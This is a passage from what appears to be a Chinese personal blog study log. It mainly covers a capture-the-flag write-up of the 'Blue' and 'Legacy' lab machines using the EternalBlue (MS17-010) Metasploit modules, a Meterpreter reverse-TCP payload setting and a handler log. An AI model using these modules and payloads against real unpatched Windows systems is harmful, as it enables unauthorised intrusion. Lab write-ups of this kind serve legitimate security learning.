悲伤的话就听听悲伤的歌吧，这样，就不会误以为自己在独自悲伤了

在这残酷的世界下，悲剧何其之多，吾等充其量只为其中之一而已

牢记这一点，背负痛苦然后继续前进吧

因为此时此处绝不是道路的终结

#### 3.2 信息搜集

`windows 7 professional 7601 service pack 1 exploit`

直接得到一个洞

[EternalBlue](https://www.exploit-db.com/exploits/42315)

等等

这个靶机的名字就叫Blue

那tm八九不离十了吧

干干干

先去msf搜索下`EternalBlue`或者`MS17-010`

拿到`exploit/windows/smb/ms17_010_eternalblue`

然后直接一套打死就完事了

找到合适的exp的话毫无难度

#### 4.2 

直接用`exploit/windows/smb/ms17_010_eternalblue`草草看

```shell
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.14.9:4444 
[*] 10.129.123.33:445 - Executing automatic check (disable AutoCheck to override)

```

哦吼。

那 设置下PAYLOAD

```shell
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

再来一次！

。。。还是不行吗

那 换一个。

`exploit/windows/smb/ms17_010_psexec`能用。

唯一要注意的是 这机子很老 所以 放flag的文件夹和现代的windows有差距

找到文件直接`type`或者`more`就得了

找到合适的exp的话毫无难度

### 5. 看【Blue】和【Legacy】的tutorial，并复盘

看了pdf后，感觉没有任何收获……

并且没有任何可以反省的

我这次做的已经很努力了，所以没问题

啊，对了 我打Legacy似乎跟题解用的不是同一个exp，23333

看来那台机子漏洞还蛮多嘛

### 6. 学习1Z0-819相关课程若干

### 7. 改良博客样式

看见左下角的尼尔机械纪元OST和右下角的steam用户简介没^_^
